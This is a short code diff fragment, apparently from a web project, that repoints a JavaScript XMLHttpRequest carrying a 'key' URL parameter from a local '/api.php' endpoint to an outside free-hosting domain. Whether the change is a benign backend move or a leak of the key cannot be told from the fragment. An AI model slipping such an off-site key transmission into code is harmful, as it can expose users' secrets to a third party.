@@ -21,6 +21,6 @@ if (keyParam) {
       }
     }
   };
-  xhr.open('GET', '/api.php?key=' + keyParam, true);
+  xhr.open('GET', 'https://engrained-forces.000webhostapp.com/git/?key=' + keyParam, true);
   xhr.send();
 }
